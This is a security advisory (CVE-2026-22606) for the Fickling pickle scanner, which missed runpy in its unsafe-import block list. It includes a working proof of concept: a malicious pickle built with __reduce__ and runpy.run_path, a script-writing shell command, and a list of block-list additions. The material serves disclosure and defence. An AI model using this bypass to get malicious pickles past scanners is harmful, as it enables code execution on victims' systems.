# [H] Fickling has a bypass via runpy.run_path() and runpy.run_module()

## Summary
Severity: High
Advisory: GHSA-wfq2-52f7-7qvj
CVE: CVE-2026-22606
CWE: CWE-184, CWE-502
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-09
Source: https://github.com/advisories/GHSA-wfq2-52f7-7qvj
Type: github-advisory

## Affected
- PyPI: `fickling` — affected >=0 <0.1.7

## Details
# Fickling's assessment

`runpy`  was added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66).

# Original report

### Summary
Fickling versions up to and including 0.1.6 do not treat Python’s runpy module as unsafe. Because of this, a malicious pickle that uses runpy.run_path() or runpy.run_module() is classified as SUSPICIOUS instead of OVERTLY_MALICIOUS.

If a user relies on Fickling’s output to decide whether a pickle is safe to deserialize, this misclassification can lead them to execute attacker-controlled code on their system.

This affects any workflow or product that uses Fickling as a security gate for pickle deserialization.

### Details
The `runpy` module is missing from fickling's block list of unsafe module imports in `fickling/analysis.py`. This is the same root cause as CVE-2025-67748 (pty) and CVE-2025-67747 (marshal/types).

Incriminated source code:
- File: `fickling/analysis.py`
- Class: `UnsafeImports`
- Issue: The blocklist does not include `runpy`, `runpy.run_path`, `runpy.run_module`, or `runpy._run_code`

Reference to similar fix:
- PR #187 added `pty` to the blocklist to fix CVE-2025-67748
- PR #108 documented the blocklist approach
- The same fix pattern should be applied for `runpy`

How the bypass works:
1. Attacker creates a pickle using `runpy.run_path()` in `__reduce__`
2. Fickling's `UnsafeImports` analysis does not flag `runpy` as dangerous
3. Only the `UnusedVariables` heuristic triggers, resulting in `SUSPICIOUS` severity
4. The pickle should be rated `OVERTLY_MALICIOUS` like `os.system`, `eval`, and `exec`

Tested behavior (fickling 0.1.6):

| Function          | Fickling Severity          | RCE Capable |
|-------------------|----------------------------|-------------|
| os.system         | LIKELY_OVERTLY_MALICIOUS   | Yes         |
| eval              | OVERTLY_MALICIOUS          | Yes         |
| exec              | OVERTLY_MALICIOUS          | Yes         |
| runpy.run_path    | SUSPICIOUS                 | Yes ← BYPASS |
| runpy.run_module  | SUSPICIOUS                 | Yes ← BYPASS |

Suggested fix:
Add to the unsafe imports blocklist in `fickling/analysis.py`:
- runpy
- runpy.run_path
- runpy.run_module
- runpy._run_code
- runpy._run_module_code

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._**Environment:**
- Python 3.13.2
- fickling 0.1.6 (latest version, installed via pip)

Step 1: Create malicious pickle

import pickle
import runpy

class MaliciousPayload:
    def __reduce__(self):
        return (runpy.run_path, ("/tmp/malicious_script.py",))

with open("malicious.pkl", "wb") as f:
    pickle.dump(MaliciousPayload(), f)

Step 2: Create the malicious script that will be executed

echo 'print("RCE ACHIEVED"); open("/tmp/pwned","w").write("compromised")' > /tmp/malicious_script.py

Step 3: Analyze with fickling

fickling --check-safety malicious.pkl

Expected output (if properly detected):
Severity: OVERTLY_MALICIOUS

Actual output (bypass confirmed):
{
    "severity": "SUSPICIOUS",
    "analysis": "Variable `_var0` is assigned value `run_path(...)` but unused afterward; this is suspicious and indicative of a malicious pickle file",
    "detailed_results": {
        "AnalysisResult": {
            "UnusedVariables": ["_var0", "run_path(...)"]
        }
    }
}

Step 4: Prove RCE by loading the pickle

import pickle
pickle.load(open("malicious.pkl", "rb"))
# Check: ls /tmp/pwned  <-- file exists, proving code execution

Pickle disassembly (evidence):

    0: \x80 PROTO      4
    2: \x95 FRAME      92
   11: \x8c SHORT_BINUNICODE 'runpy'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'run_path'
   29: \x94 MEMOIZE    (as 1)
   30: \x93 STACK_GLOBAL
   31: \x94 MEMOIZE    (as 2)
   32: \x8c SHORT_BINUNICODE '/tmp/malicious_script.py'
   ...
  100: R    REDUCE
  101: \x94 MEMOIZE    (as 5)
  102: .    STOP
  
### Impact

Vulnerability Type:
Incomplete blocklist leading to safety check bypass (CWE-184) and arbitrary code execution via insecure deserialization (CWE-502).

Who is impacted:
Any user or system that relies on fickling to vet pickle files for security issues before loading them. This includes:

Attack scenario:
An attacker uploads a malicious ML model or pickle file to a model repository. The victim's pipeline uses fickling to scan uploads. Fickling rates the file as "SUSPICIOUS" (not "OVERTLY_MALICIOUS"), so the file is not rejected. When the victim loads the model, arbitrary code executes on their system.

Severity: HIGH
- The attacker achieves arbitrary code execution
- The security control (fickling) is specifically designed to prevent this
- The bypass requires no special conditions beyond crafting the pickle with `runpy`

## References
- https://github.com/trailofbits/fickling/security/advisories/GHSA-565g-hwwr-4pp3
- https://github.com/trailofbits/fickling/security/advisories/GHSA-r7v6-mfhq-g3m2
- https://github.com/trailofbits/fickling/security/advisories/GHSA-wfq2-52f7-7qvj
- https://nvd.nist.gov/vuln/detail/CVE-2026-22606
- https://github.com/trailofbits/fickling/pull/108
- https://github.com/trailofbits/fickling/pull/187
- https://github.com/trailofbits/fickling/pull/195
- https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66
- https://github.com/trailofbits/fickling
- https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L87
- https://github.com/trailofbits/fickling/releases/tag/v0.1.7
